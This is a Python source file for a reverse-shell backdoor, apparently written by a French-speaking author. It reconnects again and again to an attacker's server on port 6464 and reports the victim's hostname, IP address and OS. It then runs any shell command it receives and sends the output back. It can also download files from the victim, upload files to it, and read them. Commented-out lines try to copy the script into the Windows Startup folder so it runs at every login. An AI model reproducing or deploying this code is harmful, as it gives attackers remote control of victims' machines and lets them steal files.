import time
import sys
import socket
import subprocess
import os
import platform
import shutil

#script_directory = os.path.dirname(__file__)
#shell:startup = C:\Users\mateo\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
#folder = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
#folder = "shell:startup"
#os.system(f"xcopy '{script_directory}' '{folder}'")

SERVER_IP = "ip"
PORT = 6464

script_directory = os.path.dirname(__file__)

def directory_path():
    new_directory = cmd[3:]
    try:
        os.chdir(new_directory)
    except Exception as e:
        print(e)
    current_directory = os.getcwd()
    s.send(current_directory.encode("latin-1"))

def get_ip():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    os_name = platform.system()
    os_version = platform.version()
    port = str(PORT)
    return f"========================================================================================================================\nHostname: {hostname}\n\nAdresse Ip: {ip_address}\n\nOs: {os_name}({os_version})\n\nPort: {port}\n ========================================================================================================================\n"

def upload():
    file = cmd[7:]
    print(file)
    time.sleep(1)
    number = s.recv(1024).decode()
    print(number)
    number2 = int(number)
    for loop in range(number2):
        try:
            binary_data = s.recv(1024)
            if not binary_data:
                print("Connection closed by the client.")
                break
        except ConnectionResetError:
            print("Connection reset by the client.")
            break
        except OSError as e:
            print(f"Error receiving data: {e}")
            break
        with open(f"{file}", "ab") as fichier:
            ecriture_file = fichier.write(binary_data)
            print(ecriture_file)
#def get_hostname():
#    hostName = socket.gethostname()
#    return hostName

def read():
    file12345test = cmd[5:]

    with open(file12345test, "r", encoding="utf-8") as testread:
        contenu = testread.read()
        s.send(contenu.encode("utf-8"))


while True:
    try:
        s = socket.socket()
        s.connect((SERVER_IP, PORT))
        hostname2 = socket.gethostname()
        ip_address2 = socket.gethostbyname(hostname2)
        s.send(get_ip().encode('utf-8'))
        time.sleep(0.1)
        s.send(ip_address2.encode('latin-1'))#pour ip
        time.sleep(0.1)
        s.send(hostname2.encode("latin-1"))
        time.sleep(0.1)
        current_directory = f"{script_directory}"#pour cd (plus stylé)
        os.chdir(current_directory)
        time.sleep(0.1)
        s.send(current_directory.encode())
        #s.send(get_hostname().encode())
        #msg = s.recv(1024).decode()
        #print('[*] Server:', msg)
        while True:
            cmd = s.recv(1024).decode()
            if cmd.startswith("download "):
                    file = cmd[9:]
                    octès = os.path.getsize(file)
                    octès2 = octès // 1024
                    if octès % 1024 != 0:
                        octès2 += 1
                        s.send(str(octès2).encode())
                        octès2 -= 1
                        time.sleep(1)
                    fichier_1024 = open(file, "rb").read()
                    s.send(fichier_1024)
                    #s.sendfile(file, offset=0, count=None)
            else:
                if cmd.startswith("cd "):
                    directory_path()
                else:
                    if cmd.lower() in ['q', 'quit', 'exit', 'x']:
                        break

                    try:
                        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
                        s.send(result)
                    except Exception as e:
                        result = str(e).encode()
                        s.send(result)

                    if len(result) == 0:
                        result = '[+] Executed Successfully'.encode()
                        s.send(result)

        s.close()
        
        time.sleep(1)

    except Exception as e:
        time.sleep(1)
